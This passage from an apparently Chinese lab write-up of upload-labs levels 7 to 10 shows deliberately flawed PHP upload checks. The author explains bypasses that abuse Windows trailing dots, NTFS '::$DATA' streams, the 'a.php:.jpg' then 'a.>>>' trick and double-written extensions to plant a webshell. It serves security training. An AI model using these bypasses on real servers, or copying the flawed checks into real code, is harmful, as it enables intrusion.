punctuation\">&#125;</span></pre></td></tr></table></figure><p>这关没有对末尾去空再根据 win 特性上传到服务器后自动清除后缀的空格</p>\n<p>即可连接</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697619213904-7f2a37ba-0411-4509-8ac8-e2f9d4e5f89c.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697619269752-23749ec5-0f99-4d78-8ba2-10c94ef9539a.png\" alt=\"img\"></p>\n<h4 id=\"第七关-绕过\"><a class=\"markdownIt-Anchor\" href=\"#第七关-绕过\">#</a> <span class=\"label warning\">第七关。绕过</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aScx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aShx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cEr\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".sWf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htaccess\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'::$DATA'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去除字符串::$DATA</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 首尾去空</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'此文件类型不允许上传！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这关没有对末尾去除点的处理 win 特性后缀末尾不能加点上传到服务器后自动删除就可以绕过了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697619505686-c548c926-f07c-44b8-8b96-13f6c3073008.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697619545395-8be2b5b0-ae9d-49f4-a84e-f86a7c9cc2d2.png\" alt=\"img\"></p>\n<h4 id=\"第八关-ntfs交换数据流data绕过上传\"><a class=\"markdownIt-Anchor\" href=\"#第八关-ntfs交换数据流data绕过上传\">#</a> <span class=\"label warning\">第八关 NTFS 交换数据流::$DATA 绕过上传</span></h4>\n<p>如果后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHp2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".Htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".pHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jSpf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".jHtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ascx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ashx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".asmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cer\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSpx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSax\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aScx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aShx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".aSmx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".cEr\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".sWf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".swf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".htaccess\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">deldot</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 删除文件名末尾的点</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 转换为小写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 首尾去空</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$deny_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'上传出错！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'此文件类型不允许上传！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'文件夹不存在,请手工创建！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697632679633-7832437c-e559-44a7-9bae-26480cfe8335.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697632638724-2f16176c-3378-4844-80c2-b1652124dab9.png\" alt=\"img\"></p>\n<h4 id=\"第九关\"><a class=\"markdownIt-Anchor\" href=\"#第九关\">#</a> <span class=\"label warning\">第九关</span></h4>\n<p>利用 windows 环境的叠加特征绕过上传</p>\n<p>在 windwos 中如果上传文件名 webshell.php:.jpg 的时候，会在目录下生产空白的文件名 webshell.php 再利用 php 和 windows 环境的叠加属性，</p>\n<p>以下符号在正则匹配时相等</p>\n<p>双引号 &quot; 等于 点号.</p>\n<p>大于符号 &gt; 等于 问号？</p>\n<p>小于符号 &lt; 等于 星号 *</p>\n<p>文件名.&lt;或文件名.&lt;&lt;&lt; 或文件名.&gt;&gt;&gt; 或文件名.&gt;&gt;&lt; 空文件名</p>\n<p>首先抓包上传 a.php:.jpg 上传会在目录里生成 a.php 空白文件，接着再次提交把 a.php 写成 a.&gt;&gt;&gt;</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697633970881-23a3f1b1-151f-4345-92d0-9e50277f9ee7.png\" alt=\"img\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2023/png/25865083/1697634015046-6ca0d0e3-8013-4c08-a0bb-4ff7936fb0e1.png\" alt=\"img\"></p>\n<p>现在里面是空的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697634068741-ff4952a2-5d00-4801-a2a1-c3db00ad9442.png\" alt=\"img\"></p>\n<p>现在就写到了 a.php 里</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697634097903-78e412c6-298e-43f0-a8b1-ccd4c741479c.png\" alt=\"img\"></p>\n<h4 id=\"第十关-双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#第十关-双写绕过\">#</a> <span class=\"label warning\">第十关 双写绕过</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token variable\">$deny_ext</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php5\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php3\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"php2\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"html\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"htm\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"phtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"pht\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jsp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jspa\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jspx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jsw\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jsv\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jspf\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"jtml\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"asp\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"aspx\"</span><span class=\"token 